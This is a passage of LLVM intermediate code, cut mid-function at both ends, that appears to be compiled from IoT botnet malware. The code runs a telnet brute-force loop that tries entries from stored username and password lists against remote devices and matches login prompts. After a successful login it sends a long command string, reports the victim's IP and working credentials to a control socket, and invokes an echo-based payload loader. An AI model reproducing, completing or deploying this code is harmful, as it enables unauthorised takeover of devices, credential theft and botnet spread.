  %245 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %244
  %246 = load i8*, i8** %245, align 8
  %247 = call i64 @strlen(i8* %246) #15
  %248 = call i64 @send(i32 %241, i8* %246, i64 %247, i32 16384) #3
  %249 = icmp slt i64 %248, 0
  %250 = load i32, i32* %240, align 16
  br i1 %249, label %251, label %254

; <label>:251:                                    ; preds = %239
  %252 = call i32 @sclose(i32 %250)
  store i8 0, i8* %41, align 8
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %253, align 1
  br label %744

; <label>:254:                                    ; preds = %239
  %255 = call i64 @send(i32 %250, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384) #3
  %256 = icmp slt i64 %255, 0
  br i1 %256, label %257, label %261

; <label>:257:                                    ; preds = %254
  %258 = load i32, i32* %240, align 16
  %259 = call i32 @sclose(i32 %258)
  store i8 0, i8* %41, align 8
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %260, align 1
  br label %744

; <label>:261:                                    ; preds = %254
  store i8 4, i8* %41, align 8
  br label %744

; <label>:262:                                    ; preds = %.lr.ph
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 6
  %264 = load i32, i32* %263, align 4
  %265 = icmp eq i32 %264, 0
  br i1 %265, label %266, label %269

; <label>:266:                                    ; preds = %262
  %267 = call i64 @time(i64* null) #3
  %268 = trunc i64 %267 to i32
  store i32 %268, i32* %263, align 4
  br label %269

; <label>:269:                                    ; preds = %266, %262
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %271 = load i32, i32* %270, align 16
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 8
  %273 = load i8*, i8** %272, align 8
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 7
  %275 = load i16, i16* %274, align 16
  %276 = zext i16 %275 to i32
  %277 = call i32 @readUntil(i32 %271, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %273, i32 1024, i32 %276)
  %278 = icmp eq i32 %277, 0
  br i1 %278, label %283, label %279

; <label>:279:                                    ; preds = %269
  store i32 0, i32* %263, align 4
  store i16 0, i16* %274, align 16
  %280 = load i8*, i8** %272, align 8
  %281 = call i8* @strstr(i8* %280, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0)) #15
  %282 = icmp ne i8* %281, null
  %.sink = select i1 %282, i8 5, i8 7
  store i8 %.sink, i8* %41, align 8
  call void @llvm.memset.p0i8.i64(i8* %280, i8 0, i64 1024, i32 1, i1 false)
  br label %744

; <label>:283:                                    ; preds = %269
  %284 = load i32, i32* %270, align 16
  %285 = load i8*, i8** %272, align 8
  %286 = load i16, i16* %274, align 16
  %287 = zext i16 %286 to i32
  %288 = call i32 @readUntil(i32 %284, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %285, i32 1024, i32 %287)
  %289 = icmp eq i32 %288, 0
  br i1 %289, label %294, label %290

; <label>:290:                                    ; preds = %283
  store i32 0, i32* %263, align 4
  store i16 0, i16* %274, align 16
  %291 = load i8*, i8** %272, align 8
  %292 = call i8* @strstr(i8* %291, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0)) #15
  %293 = icmp ne i8* %292, null
  %.sink1 = select i1 %293, i8 5, i8 7
  store i8 %.sink1, i8* %41, align 8
  call void @llvm.memset.p0i8.i64(i8* %291, i8 0, i64 1024, i32 1, i1 false)
  br label %744

; <label>:294:                                    ; preds = %283
  %295 = load i8*, i8** %272, align 8
  %296 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #15
  %297 = icmp eq i8* %296, null
  br i1 %297, label %302, label %298

; <label>:298:                                    ; preds = %294
  %299 = load i32, i32* %270, align 16
  %300 = call i32 @sclose(i32 %299)
  store i8 0, i8* %41, align 8
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %301, align 1
  br label %744

; <label>:302:                                    ; preds = %294
  %303 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #15
  %304 = icmp eq i8* %303, null
  br i1 %304, label %309, label %305

; <label>:305:                                    ; preds = %302
  %306 = load i32, i32* %270, align 16
  %307 = call i32 @sclose(i32 %306)
  store i8 0, i8* %41, align 8
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %308, align 1
  br label %744

; <label>:309:                                    ; preds = %302
  %310 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #15
  %311 = icmp eq i8* %310, null
  br i1 %311, label %316, label %312

; <label>:312:                                    ; preds = %309
  %313 = load i32, i32* %270, align 16
  %314 = call i32 @sclose(i32 %313)
  store i8 0, i8* %41, align 8
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %315, align 1
  br label %744

; <label>:316:                                    ; preds = %309
  %317 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #15
  %318 = icmp eq i8* %317, null
  br i1 %318, label %323, label %319

; <label>:319:                                    ; preds = %316
  %320 = load i32, i32* %270, align 16
  %321 = call i32 @sclose(i32 %320)
  store i8 0, i8* %41, align 8
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %322, align 1
  br label %744

; <label>:323:                                    ; preds = %316
  %324 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #15
  %325 = icmp eq i8* %324, null
  br i1 %325, label %330, label %326

; <label>:326:                                    ; preds = %323
  %327 = load i32, i32* %270, align 16
  %328 = call i32 @sclose(i32 %327)
  store i8 0, i8* %41, align 8
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %329, align 1
  br label %744

; <label>:330:                                    ; preds = %323
  %331 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #15
  %332 = icmp eq i8* %331, null
  br i1 %332, label %337, label %333

; <label>:333:                                    ; preds = %330
  %334 = load i32, i32* %270, align 16
  %335 = call i32 @sclose(i32 %334)
  store i8 0, i8* %41, align 8
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %336, align 1
  br label %744

; <label>:337:                                    ; preds = %330
  %338 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #15
  %339 = icmp eq i8* %338, null
  br i1 %339, label %344, label %340

; <label>:340:                                    ; preds = %337
  %341 = load i32, i32* %270, align 16
  %342 = call i32 @sclose(i32 %341)
  store i8 0, i8* %41, align 8
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %343, align 1
  br label %744

; <label>:344:                                    ; preds = %337
  %345 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #15
  %346 = icmp eq i8* %345, null
  br i1 %346, label %351, label %347

; <label>:347:                                    ; preds = %344
  %348 = load i32, i32* %270, align 16
  %349 = call i32 @sclose(i32 %348)
  store i8 0, i8* %41, align 8
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %350, align 1
  br label %744

; <label>:351:                                    ; preds = %344
  %352 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #15
  %353 = icmp eq i8* %352, null
  br i1 %353, label %358, label %354

; <label>:354:                                    ; preds = %351
  %355 = load i32, i32* %270, align 16
  %356 = call i32 @sclose(i32 %355)
  store i8 0, i8* %41, align 8
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %357, align 1
  br label %744

; <label>:358:                                    ; preds = %351
  %359 = call i64 @strlen(i8* %295) #15
  %360 = trunc i64 %359 to i16
  store i16 %360, i16* %274, align 16
  %361 = load i32, i32* %263, align 4
  %362 = add i32 %361, 10
  %363 = zext i32 %362 to i64
  %364 = call i64 @time(i64* null) #3
  %365 = icmp slt i64 %363, %364
  br i1 %365, label %366, label %744

; <label>:366:                                    ; preds = %358
  %367 = load i32, i32* %270, align 16
  %368 = call i32 @sclose(i32 %367)
  store i8 0, i8* %41, align 8
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %369, align 1
  br label %744

; <label>:370:                                    ; preds = %.lr.ph
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %372 = load i32, i32* %371, align 16
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 5
  %374 = load i8, i8* %373, align 1
  %375 = zext i8 %374 to i64
  %376 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %375
  %377 = load i8*, i8** %376, align 8
  %378 = call i64 @strlen(i8* %377) #15
  %379 = call i64 @send(i32 %372, i8* %377, i64 %378, i32 16384) #3
  %380 = icmp slt i64 %379, 0
  %381 = load i32, i32* %371, align 16
  br i1 %380, label %382, label %385

; <label>:382:                                    ; preds = %370
  %383 = call i32 @sclose(i32 %381)
  store i8 0, i8* %41, align 8
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %384, align 1
  br label %744

; <label>:385:                                    ; preds = %370
  %386 = call i64 @send(i32 %381, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384) #3
  %387 = icmp slt i64 %386, 0
  br i1 %387, label %388, label %392

; <label>:388:                                    ; preds = %385
  %389 = load i32, i32* %371, align 16
  %390 = call i32 @sclose(i32 %389)
  store i8 0, i8* %41, align 8
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %391, align 1
  br label %744

; <label>:392:                                    ; preds = %385
  store i8 6, i8* %41, align 8
  br label %744

; <label>:393:                                    ; preds = %.lr.ph
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 6
  %395 = load i32, i32* %394, align 4
  %396 = icmp eq i32 %395, 0
  br i1 %396, label %397, label %400

; <label>:397:                                    ; preds = %393
  %398 = call i64 @time(i64* null) #3
  %399 = trunc i64 %398 to i32
  store i32 %399, i32* %394, align 4
  br label %400

; <label>:400:                                    ; preds = %397, %393
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %402 = load i32, i32* %401, align 16
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 8
  %404 = load i8*, i8** %403, align 8
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 7
  %406 = load i16, i16* %405, align 16
  %407 = zext i16 %406 to i32
  %408 = call i32 @readUntil(i32 %402, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %404, i32 1024, i32 %407)
  %409 = icmp eq i32 %408, 0
  br i1 %409, label %427, label %410

; <label>:410:                                    ; preds = %400
  store i32 0, i32* %394, align 4
  store i16 0, i16* %405, align 16
  %411 = load i8*, i8** %403, align 8
  %412 = call i8* @strstr(i8* %411, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #15
  %413 = icmp eq i8* %412, null
  br i1 %413, label %418, label %414

; <label>:414:                                    ; preds = %410
  call void @llvm.memset.p0i8.i64(i8* %411, i8 0, i64 1024, i32 1, i1 false)
  %415 = load i32, i32* %401, align 16
  %416 = call i32 @sclose(i32 %415)
  store i8 0, i8* %41, align 8
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %417, align 1
  br label %744

; <label>:418:                                    ; preds = %410
  %419 = call i32 @matchPrompt(i8* %411)
  %420 = icmp eq i32 %419, 0
  br i1 %420, label %421, label %425

; <label>:421:                                    ; preds = %418
  call void @llvm.memset.p0i8.i64(i8* %411, i8 0, i64 1024, i32 1, i1 false)
  %422 = load i32, i32* %401, align 16
  %423 = call i32 @sclose(i32 %422)
  store i8 0, i8* %41, align 8
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %424, align 1
  br label %744

; <label>:425:                                    ; preds = %418
  store i8 7, i8* %41, align 8
  %426 = load i8*, i8** %403, align 8
  call void @llvm.memset.p0i8.i64(i8* %426, i8 0, i64 1024, i32 1, i1 false)
  br label %744

; <label>:427:                                    ; preds = %400
  %428 = load i32, i32* %401, align 16
  %429 = load i8*, i8** %403, align 8
  %430 = load i16, i16* %405, align 16
  %431 = zext i16 %430 to i32
  %432 = call i32 @readUntil(i32 %428, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %429, i32 1024, i32 %431)
  %433 = icmp eq i32 %432, 0
  br i1 %433, label %451, label %434

; <label>:434:                                    ; preds = %427
  store i32 0, i32* %394, align 4
  store i16 0, i16* %405, align 16
  %435 = load i8*, i8** %403, align 8
  %436 = call i8* @strstr(i8* %435, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #15
  %437 = icmp eq i8* %436, null
  br i1 %437, label %442, label %438

; <label>:438:                                    ; preds = %434
  call void @llvm.memset.p0i8.i64(i8* %435, i8 0, i64 1024, i32 1, i1 false)
  %439 = load i32, i32* %401, align 16
  %440 = call i32 @sclose(i32 %439)
  store i8 0, i8* %41, align 8
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %441, align 1
  br label %744

; <label>:442:                                    ; preds = %434
  %443 = call i32 @matchPrompt(i8* %435)
  %444 = icmp eq i32 %443, 0
  br i1 %444, label %445, label %449

; <label>:445:                                    ; preds = %442
  call void @llvm.memset.p0i8.i64(i8* %435, i8 0, i64 1024, i32 1, i1 false)
  %446 = load i32, i32* %401, align 16
  %447 = call i32 @sclose(i32 %446)
  store i8 0, i8* %41, align 8
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %448, align 1
  br label %744

; <label>:449:                                    ; preds = %442
  store i8 7, i8* %41, align 8
  %450 = load i8*, i8** %403, align 8
  call void @llvm.memset.p0i8.i64(i8* %450, i8 0, i64 1024, i32 1, i1 false)
  br label %744

; <label>:451:                                    ; preds = %427
  %452 = load i32, i32* %401, align 16
  %453 = load i8*, i8** %403, align 8
  %454 = load i16, i16* %405, align 16
  %455 = zext i16 %454 to i32
  %456 = call i32 @readUntil(i32 %452, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %453, i32 1024, i32 %455)
  %457 = icmp eq i32 %456, 0
  br i1 %457, label %468, label %458

; <label>:458:                                    ; preds = %451
  store i32 0, i32* %394, align 4
  store i16 0, i16* %405, align 16
  %459 = load i8*, i8** %403, align 8
  %460 = call i8* @strstr(i8* %459, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #15
  %461 = icmp eq i8* %460, null
  br i1 %461, label %466, label %462

; <label>:462:                                    ; preds = %458
  call void @llvm.memset.p0i8.i64(i8* %459, i8 0, i64 1024, i32 1, i1 false)
  %463 = load i32, i32* %401, align 16
  %464 = call i32 @sclose(i32 %463)
  store i8 0, i8* %41, align 8
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %465, align 1
  br label %744

; <label>:466:                                    ; preds = %458
  store i8 7, i8* %41, align 8
  %467 = load i8*, i8** %403, align 8
  call void @llvm.memset.p0i8.i64(i8* %467, i8 0, i64 1024, i32 1, i1 false)
  br label %744

; <label>:468:                                    ; preds = %451
  %469 = load i32, i32* %401, align 16
  %470 = load i8*, i8** %403, align 8
  %471 = load i16, i16* %405, align 16
  %472 = zext i16 %471 to i32
  %473 = call i32 @readUntil(i32 %469, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %470, i32 1024, i32 %472)
  %474 = icmp eq i32 %473, 0
  br i1 %474, label %485, label %475

; <label>:475:                                    ; preds = %468
  store i32 0, i32* %394, align 4
  store i16 0, i16* %405, align 16
  %476 = load i8*, i8** %403, align 8
  %477 = call i8* @strstr(i8* %476, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #15
  %478 = icmp eq i8* %477, null
  br i1 %478, label %483, label %479

; <label>:479:                                    ; preds = %475
  call void @llvm.memset.p0i8.i64(i8* %476, i8 0, i64 1024, i32 1, i1 false)
  %480 = load i32, i32* %401, align 16
  %481 = call i32 @sclose(i32 %480)
  store i8 0, i8* %41, align 8
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %482, align 1
  br label %744

; <label>:483:                                    ; preds = %475
  store i8 7, i8* %41, align 8
  %484 = load i8*, i8** %403, align 8
  call void @llvm.memset.p0i8.i64(i8* %484, i8 0, i64 1024, i32 1, i1 false)
  br label %744

; <label>:485:                                    ; preds = %468
  %486 = load i32, i32* %401, align 16
  %487 = load i8*, i8** %403, align 8
  %488 = load i16, i16* %405, align 16
  %489 = zext i16 %488 to i32
  %490 = call i32 @readUntil(i32 %486, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %487, i32 1024, i32 %489)
  %491 = icmp eq i32 %490, 0
  br i1 %491, label %502, label %492

; <label>:492:                                    ; preds = %485
  store i32 0, i32* %394, align 4
  store i16 0, i16* %405, align 16
  %493 = load i8*, i8** %403, align 8
  %494 = call i8* @strstr(i8* %493, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #15
  %495 = icmp eq i8* %494, null
  br i1 %495, label %500, label %496

; <label>:496:                                    ; preds = %492
  call void @llvm.memset.p0i8.i64(i8* %493, i8 0, i64 1024, i32 1, i1 false)
  %497 = load i32, i32* %401, align 16
  %498 = call i32 @sclose(i32 %497)
  store i8 0, i8* %41, align 8
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %499, align 1
  br label %744

; <label>:500:                                    ; preds = %492
  store i8 7, i8* %41, align 8
  %501 = load i8*, i8** %403, align 8
  call void @llvm.memset.p0i8.i64(i8* %501, i8 0, i64 1024, i32 1, i1 false)
  br label %744

; <label>:502:                                    ; preds = %485
  %503 = load i32, i32* %401, align 16
  %504 = load i8*, i8** %403, align 8
  %505 = load i16, i16* %405, align 16
  %506 = zext i16 %505 to i32
  %507 = call i32 @readUntil(i32 %503, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %504, i32 1024, i32 %506)
  %508 = icmp eq i32 %507, 0
  br i1 %508, label %519, label %509

; <label>:509:                                    ; preds = %502
  store i32 0, i32* %394, align 4
  store i16 0, i16* %405, align 16
  %510 = load i8*, i8** %403, align 8
  %511 = call i8* @strstr(i8* %510, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #15
  %512 = icmp eq i8* %511, null
  br i1 %512, label %517, label %513

; <label>:513:                                    ; preds = %509
  call void @llvm.memset.p0i8.i64(i8* %510, i8 0, i64 1024, i32 1, i1 false)
  %514 = load i32, i32* %401, align 16
  %515 = call i32 @sclose(i32 %514)
  store i8 0, i8* %41, align 8
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %516, align 1
  br label %744

; <label>:517:                                    ; preds = %509
  store i8 7, i8* %41, align 8
  %518 = load i8*, i8** %403, align 8
  call void @llvm.memset.p0i8.i64(i8* %518, i8 0, i64 1024, i32 1, i1 false)
  br label %744

; <label>:519:                                    ; preds = %502
  %520 = load i32, i32* %401, align 16
  %521 = load i8*, i8** %403, align 8
  %522 = load i16, i16* %405, align 16
  %523 = zext i16 %522 to i32
  %524 = call i32 @readUntil(i32 %520, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %521, i32 1024, i32 %523)
  %525 = icmp eq i32 %524, 0
  br i1 %525, label %536, label %526

; <label>:526:                                    ; preds = %519
  store i32 0, i32* %394, align 4
  store i16 0, i16* %405, align 16
  %527 = load i8*, i8** %403, align 8
  %528 = call i8* @strstr(i8* %527, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #15
  %529 = icmp eq i8* %528, null
  br i1 %529, label %534, label %530

; <label>:530:                                    ; preds = %526
  call void @llvm.memset.p0i8.i64(i8* %527, i8 0, i64 1024, i32 1, i1 false)
  %531 = load i32, i32* %401, align 16
  %532 = call i32 @sclose(i32 %531)
  store i8 0, i8* %41, align 8
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %533, align 1
  br label %744

; <label>:534:                                    ; preds = %526
  store i8 7, i8* %41, align 8
  %535 = load i8*, i8** %403, align 8
  call void @llvm.memset.p0i8.i64(i8* %535, i8 0, i64 1024, i32 1, i1 false)
  br label %744

; <label>:536:                                    ; preds = %519
  %537 = load i32, i32* %401, align 16
  %538 = load i8*, i8** %403, align 8
  %539 = load i16, i16* %405, align 16
  %540 = zext i16 %539 to i32
  %541 = call i32 @readUntil(i32 %537, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %538, i32 1024, i32 %540)
  %542 = icmp eq i32 %541, 0
  br i1 %542, label %553, label %543

; <label>:543:                                    ; preds = %536
  store i32 0, i32* %394, align 4
  store i16 0, i16* %405, align 16
  %544 = load i8*, i8** %403, align 8
  %545 = call i8* @strstr(i8* %544, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #15
  %546 = icmp eq i8* %545, null
  br i1 %546, label %551, label %547

; <label>:547:                                    ; preds = %543
  call void @llvm.memset.p0i8.i64(i8* %544, i8 0, i64 1024, i32 1, i1 false)
  %548 = load i32, i32* %401, align 16
  %549 = call i32 @sclose(i32 %548)
  store i8 0, i8* %41, align 8
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %550, align 1
  br label %744

; <label>:551:                                    ; preds = %543
  store i8 7, i8* %41, align 8
  %552 = load i8*, i8** %403, align 8
  call void @llvm.memset.p0i8.i64(i8* %552, i8 0, i64 1024, i32 1, i1 false)
  br label %744

; <label>:553:                                    ; preds = %536
  %554 = load i32, i32* %401, align 16
  %555 = load i8*, i8** %403, align 8
  %556 = load i16, i16* %405, align 16
  %557 = zext i16 %556 to i32
  %558 = call i32 @readUntil(i32 %554, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %555, i32 1024, i32 %557)
  %559 = icmp eq i32 %558, 0
  br i1 %559, label %570, label %560

; <label>:560:                                    ; preds = %553
  store i32 0, i32* %394, align 4
  store i16 0, i16* %405, align 16
  %561 = load i8*, i8** %403, align 8
  %562 = call i8* @strstr(i8* %561, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #15
  %563 = icmp eq i8* %562, null
  br i1 %563, label %568, label %564

; <label>:564:                                    ; preds = %560
  call void @llvm.memset.p0i8.i64(i8* %561, i8 0, i64 1024, i32 1, i1 false)
  %565 = load i32, i32* %401, align 16
  %566 = call i32 @sclose(i32 %565)
  store i8 0, i8* %41, align 8
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 0, i8* %567, align 1
  br label %744

; <label>:568:                                    ; preds = %560
  store i8 7, i8* %41, align 8
  %569 = load i8*, i8** %403, align 8
  call void @llvm.memset.p0i8.i64(i8* %569, i8 0, i64 1024, i32 1, i1 false)
  br label %744

; <label>:570:                                    ; preds = %553
  %571 = load i8*, i8** %403, align 8
  %572 = call i64 @strlen(i8* %571) #15
  %573 = trunc i64 %572 to i16
  store i16 %573, i16* %405, align 16
  %574 = load i32, i32* %394, align 4
  %575 = add i32 %574, 10
  %576 = zext i32 %575 to i64
  %577 = call i64 @time(i64* null) #3
  %578 = icmp slt i64 %576, %577
  br i1 %578, label %579, label %744

; <label>:579:                                    ; preds = %570
  %580 = load i32, i32* %401, align 16
  %581 = call i32 @sclose(i32 %580)
  store i8 0, i8* %41, align 8
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %582, align 1
  br label %744

; <label>:583:                                    ; preds = %.lr.ph
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %585 = load i32, i32* %584, align 16
  %586 = call i64 @send(i32 %585, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0), i64 4, i32 16384) #3
  %587 = icmp slt i64 %586, 0
  br i1 %587, label %588, label %592

; <label>:588:                                    ; preds = %583
  %589 = load i32, i32* %584, align 16
  %590 = call i32 @sclose(i32 %589)
  store i8 0, i8* %41, align 8
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %591, align 1
  br label %744

; <label>:592:                                    ; preds = %583
  store i8 8, i8* %41, align 8
  br label %744

; <label>:593:                                    ; preds = %.lr.ph
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %595 = load i32, i32* %594, align 16
  %596 = call i64 @send(i32 %595, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i64 0, i64 0), i64 7, i32 16384) #3
  %597 = icmp slt i64 %596, 0
  br i1 %597, label %598, label %602

; <label>:598:                                    ; preds = %593
  %599 = load i32, i32* %594, align 16
  %600 = call i32 @sclose(i32 %599)
  store i8 0, i8* %41, align 8
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %601, align 1
  br label %744

; <label>:602:                                    ; preds = %593
  store i8 9, i8* %41, align 8
  br label %744

; <label>:603:                                    ; preds = %.lr.ph
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %605 = load i32, i32* %604, align 16
  %606 = call i64 @send(i32 %605, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %607 = icmp slt i64 %606, 0
  br i1 %607, label %608, label %612

; <label>:608:                                    ; preds = %603
  %609 = load i32, i32* %604, align 16
  %610 = call i32 @sclose(i32 %609)
  store i8 0, i8* %41, align 8
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %611, align 1
  br label %744

; <label>:612:                                    ; preds = %603
  %613 = load i32, i32* @mainCommSock, align 4
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 1
  %615 = load i32, i32* %614, align 4
  %616 = call i8* @inet_ntoa(i32 %615) #3
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 4
  %618 = load i8, i8* %617, align 2
  %619 = zext i8 %618 to i64
  %620 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %619
  %621 = load i8*, i8** %620, align 8
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 5
  %623 = load i8, i8* %622, align 1
  %624 = zext i8 %623 to i64
  %625 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %624
  %626 = load i8*, i8** %625, align 8
  %627 = call i32 (i32, i8*, ...) @sockprintf(i32 %613, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %616, i8* %621, i8* %626)
  store i8 10, i8* %41, align 8
  br label %744

; <label>:628:                                    ; preds = %.lr.ph
  call void @echoLoader()
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %630 = load i32, i32* %629, align 16
  %631 = call i64 @send(i32 %630, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.75, i64 0, i64 0), i64 61, i32 16384) #3
  store i8 11, i8* %41, align 8
  br label %744

; <label>:632:                                    ; preds = %.lr.ph
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
